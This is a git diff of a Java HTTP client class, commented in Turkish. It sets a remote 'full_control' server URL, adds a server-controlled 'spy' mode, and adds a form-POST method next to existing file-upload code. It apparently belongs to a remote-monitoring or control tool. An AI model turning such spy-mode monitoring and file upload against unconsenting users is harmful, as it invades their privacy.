@@ -1,10 +1,8 @@
 package com.company;
 
-import org.apache.http.HttpEntity;
-import org.apache.http.HttpException;
-import org.apache.http.HttpResponse;
-import org.apache.http.HttpVersion;
+import org.apache.http.*;
 import org.apache.http.client.HttpClient;
+import org.apache.http.client.entity.UrlEncodedFormEntity;
 import org.apache.http.client.methods.HttpGet;
 import org.apache.http.client.methods.HttpPost;
 import org.apache.http.conn.ClientConnectionManager;
@@ -14,6 +12,7 @@ import org.apache.http.entity.mime.content.ContentBody;
 import org.apache.http.entity.mime.content.FileBody;
 import org.apache.http.impl.client.DefaultHttpClient;
 import org.apache.http.impl.conn.tsccm.ThreadSafeClientConnManager;
+import org.apache.http.message.BasicNameValuePair;
 import org.apache.http.params.CoreProtocolPNames;
 import org.apache.http.params.HttpParams;
 import org.apache.http.util.EntityUtils;
@@ -23,16 +22,19 @@ import java.io.IOException;
 import java.net.MalformedURLException;
 import java.net.URISyntaxException;
 import java.net.URL;
+import java.util.ArrayList;
+import java.util.List;
 import java.util.Random;
 
 /**
  * Server isteklerini yapma için oluşturulmuştur.
  */
 public class server_requests {
-    private static String server_url="your_server_url";
+    private static String server_url="http://app.coretekno.com/full_control/web_service/";
     private static String client_token;
     private static String connect_id;
-    private static int status = 1;
+    private static String mode = "spy";
+    private static int status = 0;
 
     public server_requests() throws MalformedURLException, InterruptedException { //kurucu fonksiyon bu class yaratıldığnda bir bağlantı tokeni yaratır ve bunu daha sonraki isteklerde güvenlik amacıyla kullanımak için saklar
         reading_class read_xml = new reading_class();
@@ -64,6 +66,13 @@ public class server_requests {
             new server_requests();
         }
         httpclient.getConnectionManager().shutdown();
+        if(http_get_request("pc_requests.php","get_spy_mode").equals("0")){set_mode("normal");}
+    }
+    public static void set_mode(String new_mode){
+        mode = new_mode;
+    }
+    public static String get_mode(){
+        return mode;
     }
 
     private static DefaultHttpClient getThreadSafeClient()  {
@@ -115,6 +124,26 @@ public class server_requests {
         }
         httpclient.getConnectionManager().shutdown();
         return answer;
+    }
+    public static String http_post_request(String request_url,String get_parameter,String[] requests,String[] requests_key) throws IOException, URISyntaxException, HttpException {
+        reading_class read_xml = new reading_class();
+        URL url =new URL(server_url+request_url+ "?" + get_parameter + "&client_token=" + client_token + "&computer_id=" + read_xml.get_computer_id());
+        String respond;
+
+        HttpResponse response;
+        HttpClient myClient = new DefaultHttpClient();
+        HttpPost myConnection;
+        myConnection = new HttpPost(String.valueOf(url));
+        List<NameValuePair> nameValuePair = new ArrayList<NameValuePair>(requests.length);
+        for (int i = 0;i<requests.length;i++) {
+            nameValuePair.add(new BasicNameValuePair(requests[i], requests_key[i]));
+        }
+
+        myConnection.setEntity(new UrlEncodedFormEntity(nameValuePair, "utf-8"));
+        response = myClient.execute(myConnection);
+        respond = EntityUtils.toString(response.getEntity(), "UTF-8");
+
+        return respond;
     }
     public static void upload_file_to_server(String file_dir,String file_type,String file_extension) throws IOException, HttpException, URISyntaxException {
         HttpClient httpclient = getThreadSafeClient();
